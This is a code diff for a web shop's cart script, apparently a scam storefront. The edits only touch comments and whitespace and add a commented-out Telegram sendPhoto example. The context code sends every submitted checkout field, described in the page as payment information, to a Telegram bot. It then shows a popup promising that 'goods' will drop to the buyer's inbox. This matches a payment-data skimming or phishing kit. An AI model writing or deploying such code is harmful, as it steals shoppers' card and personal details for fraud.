@@ -53,7 +53,7 @@ document.addEventListener('DOMContentLoaded', function () {
           </div>
           <button class="remove-item" data-index="${index}">x</button>
         `;
-
+        
         cartList.appendChild(cartItem);
       });
     }
@@ -156,7 +156,7 @@ document.addEventListener('DOMContentLoaded', function () {
         message += `${key}: ${value}\n`;
       });
 
-      // Send data to Telegram
+      // Send cart info message to Telegram
       fetch(`https://api.telegram.org/bot${telegramApiKey}/sendMessage`, {
         method: 'POST',
         headers: {
@@ -171,11 +171,12 @@ document.addEventListener('DOMContentLoaded', function () {
         .then(data => {
           if (data.ok) {
             console.log('Message sent to Telegram!');
-            alert('Your request has been sent!');
+            alert('Your request has been sent!'); // Prevent default popup
+
             localStorage.removeItem('cartItems');
             renderCartItems();
 
-            // Show confirmation message with success text and image
+            // Show custom payment confirmation message with success text and image
             const paymentPopup = document.getElementById('payment-popup');
             paymentPopup.innerHTML = `✅✅✅✅✅ <br><br> Your Payment Information Has Been Submitted! Your Goods Should Drop To Your Inbox Soon.<br><br> If Your Goods Are Not Received Within 25 Minutes! Please Check Your Spam Email Folder! <br><br> Can't Locate Your Goods Or Need A Refund? Find The SUPPORT Tab in the Navigation. Without a Proof Of Payment Confirmation Refunds Are Guaranteed! <br><br>`;
             paymentPopup.style.backgroundColor = '#007BFF'; // Light blue background
@@ -202,6 +203,22 @@ document.addEventListener('DOMContentLoaded', function () {
           }
         })
         .catch(error => console.error('Error:', error));
+
+      // If you need to send an image separately, you can add this step after the message:
+      // fetch(`https://api.telegram.org/bot${telegramApiKey}/sendPhoto`, {
+      //   method: 'POST',
+      //   headers: {
+      //     'Content-Type': 'application/json',
+      //   },
+      //   body: JSON.stringify({
+      //     chat_id: chatId,
+      //     photo: "URL_or_file_id_of_your_image",
+      //   }),
+      // })
+      // .then(response => response.json())
+      // .then(data => {
+      //   console.log('Image sent:', data);
+      // });
     });
   });
 
